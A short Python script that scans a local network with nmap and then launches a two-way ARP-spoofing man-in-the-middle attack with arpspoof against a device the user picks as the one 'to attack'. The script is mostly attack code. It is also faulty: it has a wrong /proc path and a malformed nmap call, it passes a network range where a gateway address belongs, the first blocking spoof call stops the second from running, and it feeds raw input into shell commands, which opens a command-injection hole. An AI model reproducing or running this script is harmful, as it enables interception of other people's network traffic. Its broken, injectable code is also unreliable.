import os
import nmap

nm = nmap.nmap.PortScanner()

gateway = input ('Gateway Ex. 192.168.1.1/24: ') # GATEWAY
print ('')

print ("Let's Scan Your Network")
scan_range = nm.scan(hosts=gateway) # SCAN NETWORK
print(scan_range['scan'])
print ('')

device = input ('Device to Attack: ') # DEVICE TO ATTACK

print ('Activating IP Forwarding')
os.system('echo 1 >> /proc/sys/net_ipv4/ip_forward') # IP FORWARDING
print ('')

network_interface = input('Network Interface to use: ')
print('')

os.system('arpspoof -i ' + network_interface + ' -t ' + device + " " + gateway) # SPOOFING
os.system('arpspoof -i ' + network_interface + ' -t ' + gateway + " " + device) # SPOOFING

print('Do you want to Stop Attack? ')
print('Press Enter')
os.system('echo 0 >> /proc/sys/net_ipv4/ip_forward') # STOP IP FORWARDING
